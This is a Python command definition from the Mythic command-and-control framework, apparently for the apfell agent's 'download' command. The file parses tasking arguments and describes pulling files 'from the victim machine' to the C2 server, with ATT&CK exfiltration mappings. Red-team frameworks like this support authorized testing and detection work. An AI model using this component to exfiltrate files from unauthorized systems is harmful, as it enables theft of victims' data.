from CommandBase import *
import json
from MythicResponseRPC import *


class DownloadArguments(TaskArguments):
    def __init__(self, command_line):
        super().__init__(command_line)
        self.args = {}

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                temp_json = json.loads(self.command_line)
                if "host" in temp_json:
                    # this means we have tasking from the file browser rather than the popup UI
                    # the apfell agent doesn't currently have the ability to do _remote_ listings, so we ignore it
                    self.command_line = temp_json["path"] + "/" + temp_json["file"]
                else:
                    raise Exception("Unsupported JSON")


class DownloadCommand(CommandBase):
    cmd = "download"
    needs_admin = False
    help_cmd = "download {path to remote file}"
    description = "Download a file from the victim machine to the Mythic server in chunks (no need for quotes in the path)."
    version = 1
    is_exit = False
    is_file_browse = False
    is_process_list = False
    is_download_file = True
    is_remove_file = False
    is_upload_file = False
    author = "@its_a_feature_"
    parameters = []
    attackmapping = ["T1020", "T1030", "T1041"]
    argument_class = DownloadArguments
    browser_script = BrowserScript(script_name="download", author="@its_a_feature_")

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        resp = await MythicResponseRPC(task).register_artifact(
            artifact_instance="$.NSFileHandle.fileHandleForReadingAtPath, readDataOfLength",
            artifact_type="API Called",
        )
        return task

    async def process_response(self, response: AgentResponse):
        pass
